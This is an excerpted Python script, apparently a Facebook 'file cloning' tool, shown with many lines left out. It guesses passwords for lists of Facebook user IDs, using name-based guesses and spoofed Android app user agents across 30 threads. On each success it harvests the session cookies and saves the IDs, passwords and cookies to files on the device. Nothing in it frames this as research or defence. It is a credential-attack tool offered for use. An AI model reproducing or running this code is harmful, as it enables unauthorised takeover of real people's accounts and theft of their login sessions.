...
try:
#=====[========GIFT=========]=============#
#FILE CLONE SCRIPT GIFT BY RIYAD AXN TOOLS
...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO RIYAD WORLD          ')
...
from concurrent.futures import ThreadPoolExecutor as GsRIYAD
from string import * 
...
totaldmp = 0
filter = []
sys.stdout.write('\x1b]2; RIYAD\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWONER     \x1b[1;97m● \033[38;5;46mRIYAD
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mGuthub   \x1b[1;97m  ● \033[38;5;46mRiyad22750
...
while attemps < 12345677901:
    ...
    if username == 'RIYAD' and password == 'RIYAD':
...
def meyexudi():
  ...
  id = '-'.join(uuid)
  try:
    httpCaht = requests.get('https://github.com/RIYAD950/Aprooval/blob/main/Aprooval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back RIYAD Menu ")
        exit()
def menu():   
    os.system('clear')
    print(logo)
...
git clone https://github.com/RIYAD950/FILE-RANDOM.git
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RIYADgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RIYADgift};{ckkk}"
                    print(f"\r{R} [FMZ-999-OK] {sid} | {ps} ")
				#	#{S}\n[cookie[🔥]={ckkk}
                    oks.append(sid)
                    open('/sdcard/FMZ-999_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RIYAD_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
...
'Content-Length': str(len(content_lenght))}
    ...
    def methodB(self, sid, name, psw):
        try:
            ...
            RIYAD = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/"+fban+";FBAV/"+facebook_version+";FBBV/"+fbbv+";FBDM/{density=3.0,width=1080,height=1920};FBLC/"+fbcl+";FBRV/"+fbrv+";FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+fbpn+";FBDV/"+model+";FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=1920};FBLC/uk_UA;FBRV/213212609;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'Content-Length': str(len(content_lenght))}
    ...
    def pasw(self):       
            ...
            print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with GsRIYAD(max_workers=30) as RIYADgift:
              for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                RIYADgift.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RIYADgift.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                RIYADgift.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                RIYADgift.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
